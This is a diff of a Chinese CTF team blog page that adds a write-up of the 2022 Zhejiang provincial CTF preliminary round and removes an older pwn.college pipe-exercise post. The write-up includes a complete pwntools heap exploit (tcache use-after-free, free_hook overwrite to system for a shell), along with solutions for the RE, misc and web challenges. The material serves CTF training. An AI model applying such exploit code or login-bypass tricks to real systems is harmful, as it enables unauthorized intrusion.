@@ -163,7 +163,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -197,6 +197,231 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3ape1团队笔记">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | R3ape1团队笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/" class="post-title-link" itemprop="url">2022浙江省ctf初赛</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-09-20 21:16:00" itemprop="dateCreated datePublished" datetime="2022-09-20T21:16:00+08:00">2022-09-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-04-01 16:52:11" itemprop="dateModified" datetime="2023-04-01T16:52:11+08:00">2023-04-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Eu21ka/pwn-exercises/tree/main/2022%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B">题目附件下载地址</a></p>
+</blockquote>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。</p>
+<p><strong>EXP：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">x,file_name</span>):</span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;1.14.97.218&#x27;</span>,<span class="number">22785</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p,ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input your choice: &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;input content: &#x27;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">elf,p,libc=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap=u64(p.recvline().replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap:&#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">1</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x7f</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-</span><br><span class="line">libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive(</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这周虚拟机崩了，之前写的脚本也就丢失了，所以就直接拿了别的师傅的exp，和我的攻击思路应该大差不差。</p>
+</blockquote>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h2><p>第一个检查是猜幸运数字，把程序拖进ida，通过字符串查询“First check”就可以立马定位到如下图所示的函数，然后易得出那个要猜的数字就是<code>77</code></p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204556151.png" class="" title="image-20220920204556151">
+
+<p>第二个检查根据问题敲敲计算器就可以计算出<code>55</code>和<code>49</code>两个答案，程序中的判断如下图所示</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204745404.png" class="" title="image-20220920204745404">
+
+<p>第三个检查依旧可以利用字符串查找来定位到关键函数，可看到下图中的11行就是判断</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204900834.png" class="" title="image-20220920204900834">
+
+<p>最后可以看到如下图所示的运算</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920205002693.png" class="" title="image-20220920205002693">
+
+<p>是循环移位，直接用python跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=<span class="number">1718896489</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(x&gt;&gt;<span class="number">16</span>)+((x&amp;(<span class="number">2</span>**<span class="number">16</span>-<span class="number">1</span>))&lt;&lt;<span class="number">16</span>)</span><br><span class="line"><span class="number">1198089844</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="好怪哦"><a href="#好怪哦" class="headerlink" title="好怪哦"></a>好怪哦</h2><p>下载附件，发现是个损坏的压缩包，用winhex打开看看</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.gif" class="" title="图片">
+
+<p>发现是都翻转过的16进制，于是用随波逐流进行hex_str翻转</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.gif" class="" title="图片">
+
+<p>复制翻转修复好的16进制码，在winhex中还原出新的压缩包</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.gif" class="" title="图片">
+
+<p>保存好后打开压缩包，一张损坏的png图片，同样拉进winhex</p>
+<p>发现缺少png文件头，89504E47给它补上</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image008.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image010.gif" class="" title="图片">
+
+<p>发现是一半的图片，修改高度得到flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image012.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image014.gif" class="" title="图片">
+
+<p>DASCTF{f8b275b06baf4204fa62743eab5eca98}</p>
+<h2 id="神奇的棋盘"><a href="#神奇的棋盘" class="headerlink" title="神奇的棋盘"></a>神奇的棋盘</h2><p>下载附件</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image016.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image018.gif" class="" title="图片">
+
+<p>看了眼附件，应该是棋盘加密，拿原先的棋盘对比一下</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image020.jpg" class="" title="图片">
+
+<p>对照替换</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image022.jpg" class="" title="图片">
+
+<p>到这里没什么思路了，去看看给的图片有没有隐藏信息，因为是png，所以先想到的是lsb隐写</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image024.jpg" class="" title="图片">
+
+<p>zsteg发现有段base32（stegsolve RGB0通道也可以解出），解出来是个key</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image026.jpg" class="" title="图片">
+
+<p>LastKey{Yusayyds}</p>
+<p>有了key直接随波逐流ADFGVX解密</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image028.jpg" class="" title="图片">
+
+<p>明文进行16进制转换得到flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image030.gif" class="" title="图片">
+
+<p>DASCTF{d859c41c530afc1c1ad94abd92f4baf8}</p>
+<h2 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h2><p>下载附件，八个加密文件</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image032.gif" class="" title="图片">
+
+<p>文件大小都相同，CRC32爆破</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image034.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image036.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image038.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image040.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image042.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image044.gif" class="" title="图片">
+
+<p>password gZinflAte_BasE64，解压下来流量包，开始分析</p>
+<p>查看协议分级</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image046.gif" class="" title="图片">
+
+<p>追踪tcp流</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image048.gif" class="" title="图片">
+
+<p>在不同的流发现了不同的这样的数据，tshark提取数据</p>
+<p>tshark -r segmentFlow.pcapng -T fields -e urlencoded-form.value | sed ‘&#x2F;^\s*$&#x2F;d’ &gt; 1.txt</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image050.gif" class="" title="图片">
+
+<p>用notepad将,替换成换行符</p>
+<p><img src="E:/笔记/pwn/临时笔记/2022浙江省ctf初赛/clip_image052.gif" alt="图片"></p>
+<p>在这里发现了压缩包的16进制</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image054.gif" class="" title="图片">
+
+<p>将每一段提取出来拼接</p>
+<p>504B03041400000008006EAE86547BF6F39C2A0000002800000008000000666C61672E74787473710C760E71AB364B4D4C49344BB530314C364A4D4E32334E4A4E344834333731B2B0B04C32B0A80500504B01021F001400000008006EAE86547BF6F39C2A00000028000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800027E256ABD49D801027E256ABD49D8013254A060BD49D801504B050600000000010001005A000000500000000000</p>
+<p>转换为压缩包</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image056.gif" class="" title="图片">
+
+<p>得到flag<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image058.gif" class="" title="图片"></p>
+<p>DASCTF{6eada6e841c2ecb63bca0a6742889b08}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image007.png" class="" title="img">
+
+
+<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>读取规则</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image009.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image011.jpg" class="" title="img">
+
+<p>注册时使用Admin盲猜登陆时后台有转小写的函数所以将admin的账号登录成功获得flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image013.jpg" class="" title="img">
+
+
+
+<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>游戏类题目两种思路：</p>
+<p>1、 与后端有交互（通过抓包改包更改分数从而获取flag）</p>
+<p>2、 与后端无交互（一般flag隐藏于js代码中，关键字+细心即可找到flag）</p>
+<p>观察发现与后端无传输所以怀疑在前端进入对应的两个js文件找到flag</p>
+<p>此题通过观察找到两个js文件读取获得flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image015.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image017.jpg" class="" title="img">
+
+<p>解码获得</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1468,105 +1693,6 @@
 
 
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题其实就是考查对栈结构的理解，相比普通的ret2libc，这题涉及相邻两个栈帧的利用。然后要注意程序的小端序输入，这保证了第一个地址的有效性，也保证了后续利用。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2022/07/12/embryoio%20level36~level59/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="nnnpc、commit、Eureka">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R3ape1团队笔记">
-      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | R3ape1团队笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/07/12/embryoio%20level36~level59/" class="post-title-link" itemprop="url">embryoio level36~level59</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-07-12 20:07:00 / 修改时间：20:09:09" itemprop="dateCreated datePublished" datetime="2022-07-12T20:07:00+08:00">2022-07-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/pwncollege%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwncollege刷题</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="embryoio-level36-level47"><a href="#embryoio-level36-level47" class="headerlink" title="embryoio level36~level47"></a>embryoio level36~level47</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>Linux终端和shell脚本的管道符使用</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><img src="/2022/07/12/embryoio%20level36~level59/image-20220712132719498.png" class="" title="image-20220712132719498">
-
-<p>它显示需要我们去接收程序的输出流，而且下面有说需要用管道，所以指令后面加上管道接其它指令即可。</p>
-<h3 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/challenge/embryoio36 | cat</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level37 | grep &#x27;pwn&#x27; #取关键字</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level38 | sed &#x27;1d&#x27;	#删除第一行</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level39 | rev | rev	#两次取反就正常输出了</span><br><span class="line"></span><br><span class="line">cat | /challenge/embryoio_level40	#再输入密码获得flag</span><br><span class="line"></span><br><span class="line">rev | rev | /challenge/embryoio_level41	#两次取反后直接输入密码获得flag（可能输入密码后需要按ctrl+d flag才会出现）</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以下指令要写入shell脚本中，再bash运行shell脚本</span></span><br><span class="line">/challenge/embryoio_level42 | cat</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level43 | grep &#x27;pwn&#x27;</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level44 | sed &#x27;1d&#x27;</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level45 | rev | rev</span><br><span class="line"></span><br><span class="line">cat | /challenge/embryoio_level46</span><br><span class="line"></span><br><span class="line">rev | rev | /challenge/embryoio_level47	#直接输入密码获得flag（可能输入密码后需要按ctrl+d flag才会出现）</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="embryoio-level48-level59"><a href="#embryoio-level48-level59" class="headerlink" title="embryoio level48~level59"></a>embryoio level48~level59</h1><h2 id="题目简介-1"><a href="#题目简介-1" class="headerlink" title="题目简介"></a>题目简介</h2><p>python脚本中的管道使用</p>
-<h2 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h3><img src="/2022/07/12/embryoio%20level36~level59/image-20220712135029230.png" class="" title="image-20220712135029230">
-
-<p>可以看到需要让我们用python运行</p>
-<img src="/2022/07/12/embryoio%20level36~level59/image-20220712135209976.png" class="" title="image-20220712135209976">
-
-<p>编写python脚本运行后又出现需要管道接收输出的提示。</p>
-<h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#===============================level48===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;/challenge/embryoio_level48&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level49===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level49&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;pwn&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level50===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level50&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;1d&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level51===============================</span></span><br><span class="line"><span class="comment">#将逆序的flag复制到文本里，再rev输出</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level51&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = 